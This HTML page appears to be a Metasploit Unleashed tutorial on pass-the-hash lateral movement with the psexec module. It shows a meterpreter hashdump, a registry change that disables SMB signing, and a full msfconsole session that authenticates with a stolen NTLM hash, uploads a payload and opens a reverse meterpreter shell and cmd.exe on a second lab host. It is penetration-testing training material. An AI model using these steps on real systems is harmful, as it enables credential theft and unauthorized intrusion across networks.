<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>PSexec Pass The Hash</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">PSexec
Pass The Hash</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">One module that isn't widely known is
the ability to use PSEXEC
within Metasploit. The psexec module is often used by penetration
testers to obtain access
to a given system that you already know the credentials for. It was
written by sysinternals and has been integrated within the framework.
Often as penetration
testers, we successfully gain access to a system through some exploit,
use meterpreter to grab the passwords or other methods like fgdump,
pwdump, or cachedump
and then utilize rainbowtables to crack those hash values.
</p>
<p style="color: rgb(0, 0, 0);">We also have other options like pass
the hash through tools
like iam.exe. One great method with psexec in metasploit is it allows
you to enter the password itself,
or you can simply just specify the hash values, no need to crack to
gain access to the system. Let's think deeply about how we can utilize
this attack to further
penetrate a network. Lets first say we compromise a system that has an
administrator password on the system, we don't need to crack it because
psexec allows us to
utilize just the hash values, that administrator account is the same on
every account within the domain infrastructure. We can now go from
system to system without
ever having to worry about cracking the password. One important thing
to note on this is that if NTLM is only available (for example its a
15+ character password or
through GPO they specify NTLM response only), simply replace the
****NOPASSWORD**** with 32 0's for example:
<br>
<br>
</p>
<pre id="code">******NOPASSWORD*******:8846f7eaee8fb117ad06bdd830b7586c</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Would be replaced by:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">00000000000000000000000000000000:8846f7eaee8fb117ad06bdd830b7586c</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">While testing this in your lab, you
may encounter the following error even though you are using the correct
credentials:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">STATUS_ACCESS_DENIED (Command=117 WordCount=0)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">This can be remedied by navigating
to the registry key, </span><b style="color: rgb(0, 0, 0);">"HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\LanManServer\Parameters"</b><span
 style="color: rgb(0, 0, 0);"> on the target systems and setting the
value of </span><b style="color: rgb(0, 0, 0);">"RequireSecuritySignature"</b><span
 style="color: rgb(0, 0, 0);"> to </span><b
 style="color: rgb(0, 0, 0);">"0"</b><span style="color: rgb(0, 0, 0);">.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">[*] Meterpreter session 1 opened (192.168.57.139:443 -&gt; 192.168.57.131:1042)<br><br><u>meterpreter</u> &gt; use priv           <br>Loading extension priv...success.<br><u>meterpreter</u> &gt; hashdump<br>Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::<br><u>meterpreter</u> &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we have a meterpreter
console and dumped the hashes, lets
connect to a different victim using PSExec and just the hash values.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">root@bt4:/pentest/exploits/framework3# ./msfconsole<br><br>                                  _<br>                                 | |      o<br> _  _  _    _ _|_  __,   ,    _  | |  __    _|_<br>/ |/ |/ |  |/  |  /  |  / \_|/ \_|/  /  \_|  |<br>  |  |  |_/|__/|_/\_/|_/ \/ |__/ |__/\__/ |_/|_/<br>                           /|<br>                           \|<br><br><br>       =[ metasploit v3.3-rc1 [core:3.3 api:1.0]<br>+ -- --=[ 412 exploits - 261 payloads<br>+ -- --=[ 21 encoders - 8 nops<br>       =[ 191 aux<br><br>msf &gt; search psexec<br>[*] Searching loaded modules for pattern 'psexec'...<br><br>Exploits<br>========<br><br>   Name                       Description<br>   ----                       -----------<br>   windows/smb/psexec         Microsoft Windows Authenticated User Code Execution<br>   windows/smb/smb_relay      Microsoft Windows SMB Relay Code Execution<br><br>msf &gt; use windows/smb/psexec<br>msf exploit(psexec) &gt; set payload windows/meterpreter/reverse_tcp<br>payload =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(psexec) &gt; set LHOST 192.168.57.133<br>LHOST =&gt; 192.168.57.133<br>msf exploit(psexec) &gt; set LPORT 443<br>LPORT =&gt; 443<br>msf exploit(psexec) &gt; set RHOST 192.168.57.131<br>RHOST =&gt; 192.168.57.131<br>msf exploit(psexec) &gt; show options<br><br>Module options:<br><br>   Name     Current Setting  Required  Description<br>   ----     ---------------  --------  -----------<br>   RHOST    192.168.57.131   yes       The target address<br>   RPORT    445              yes       Set the SMB service port<br>   SMBPass                   no        The password for the specified username<br>   SMBUser  Administrator    yes       The username to authenticate as<br><br><br>Payload options (windows/meterpreter/reverse_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  thread           yes       Exit technique: seh, thread, process<br>   LHOST     192.168.57.133   yes       The local address<br>   LPORT     443              yes       The local port<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Automatic<br><br><br>msf exploit(psexec) &gt; set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c<br>SMBPass =&gt; e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c<br>msf exploit(psexec) &gt; exploit<br><br>[*] Connecting to the server...<br>[*] Started reverse handler<br>[*] Authenticating as user 'Administrator'...<br>[*] Uploading payload...<br>[*] Created \KoVCxCjx.exe...<br>[*] Binding to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...<br>[*] Bound to 367abb81-9844-35f1-ad32-98f038001003:2.0@ncacn_np:192.168.57.131[\svcctl] ...<br>[*] Obtaining a service manager handle...<br>[*] Creating a new service (XKqtKinn - "MSSeYtOQydnRPWl")...<br>[*] Closing service handle...<br>[*] Opening service...<br>[*] Starting the service...<br>[*] Removing the service...<br>[*] Closing service handle...<br>[*] Deleting \KoVCxCjx.exe...<br>[*] Sending stage (719360 bytes)<br>[*] Meterpreter session 1 opened (192.168.57.133:443 -&gt; 192.168.57.131:1045)<br><br><u>meterpreter</u> &gt; execute -f cmd.exe -i -c -H<br>Process 3680 created.<br>Channel 1 created.<br>Microsoft Windows [Version 5.2.3790]<br>(C) Copyright 1985-2003 Microsoft Corp.<br><br>C:\WINDOWS\system32&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">That is it! We successfully connect
to a seperate computer with the
same credentials without having to worry about rainbowtables or
cracking the password. Special thanks to Chris Gates for the
documentation on this.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/MSF_Post_Exploitation"
 title="MSF Post Exploitation">MSF Post Exploitation</a></div>
</body>
</html>
